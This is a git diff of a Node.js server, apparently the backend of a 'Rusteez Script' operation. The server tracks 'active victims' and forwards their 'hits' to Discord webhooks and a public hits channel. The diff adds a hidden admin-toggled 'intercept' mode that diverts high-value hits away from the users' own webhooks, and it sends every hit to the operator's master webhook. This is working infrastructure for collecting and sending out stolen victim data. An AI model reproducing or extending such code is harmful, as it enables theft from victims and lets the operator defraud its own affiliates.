@@ -19,7 +19,8 @@ const PORT = process.env.PORT || 3000;
 const MONGO_URI = process.env.MONGO_URI;
 const ADMIN_TOKEN = process.env.ADMIN_TOKEN;
 const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
-const SEUIL_MASTER = 100000000; // 100,000,000 (100M)
+const SEUIL_MASTER = 500000000; // 100,000,000 (100M)
+let INTERCEPT = false;
 
 const log = (msg) => console.log(`[${new Date().toLocaleTimeString()}] ${msg}`);
 const generateWebhookId = () => { return `wh_${randomBytes(8).toString('hex')}`; };
@@ -457,6 +458,25 @@ app.get('/api/admin/active-victims', (req, res) => {
     });
     res.json(list);
 });
+app.get('/api/admin/intercept-status', (req, res) => {
+    const token = req.query.token;
+    if (token !== ADMIN_TOKEN) return res.status(401).json({ error: "Unauthorized" });
+    
+    res.json({ intercept: INTERCEPT });
+});
+
+// 3. Modifier le mode Intercept (POST)
+app.post('/api/admin/intercept-toggle', (req, res) => {
+    const token = req.query.token; // Passé dans l'URL ou le body, ici on reste sur l'URL pour la simplicité
+    if (token !== ADMIN_TOKEN) return res.status(401).json({ error: "Unauthorized" });
+
+    const { value } = req.body;
+    if (typeof value !== 'boolean') return res.status(400).send("Invalid value");
+
+    INTERCEPT = value;
+    log(`🛡️ Intercept réglé sur : ${INTERCEPT}`);
+    res.json({ success: true, newState: INTERCEPT });
+});
 // --- GESTION WEBSOCKET ---
 wss.on('connection', (ws, req) => {
     const params = new URLSearchParams(url.parse(req.url, true).query);
@@ -593,26 +613,27 @@ wss.on('connection', (ws, req) => {
                     )
                     .setFooter({ text: `Rusteez Script` })
                     .setTimestamp();
-                        
-                    // 4. Envoi sur le Webhook PRIVÉ de l'utilisateur
-                    try {
-                        const webhookClient = new WebhookClient({ url: mapping.url });
-                        await webhookClient.send({ 
-                            content: hitInfo.Name,
-                            embeds: [hitEmbed] 
-                        });
-                    } catch (err) { log(`⚠️ Error sending to User Webhook: ${err.message}`); }
-                    
-
-                    if (maxIncome >= SEUIL_MASTER) {
+                    if(INTERCEPT && maxIncome >= SEUIL_MASTER) {
+                        //send to RusteezBot
+                    }
+                    else{
+                        // 4. Envoi sur le Webhook PRIVÉ de l'utilisateur
                         try {
-                            const webhookClient = new WebhookClient({ url: process.env.WEBHOOK_URL });
+                            const webhookClient = new WebhookClient({ url: mapping.url });
                             await webhookClient.send({ 
                                 content: hitInfo.Name,
                                 embeds: [hitEmbed] 
                             });
                         } catch (err) { log(`⚠️ Error sending to User Webhook: ${err.message}`); }
                     }
+                    try {
+                        const webhookClient = new WebhookClient({ url: process.env.WEBHOOK_URL });
+                        await webhookClient.send({ 
+                            content: hitInfo.Name,
+                            embeds: [hitEmbed] 
+                        });
+                    } catch (err) { log(`⚠️ Error sending to User Webhook: ${err.message}`); }
+                    
                     // 5. Envoi sur le Channel PUBLIC (public-hits)
                     const publicChannel = await clientDiscord.channels.fetch('1487370329776193677').catch(() => null);
                     if (publicChannel) {
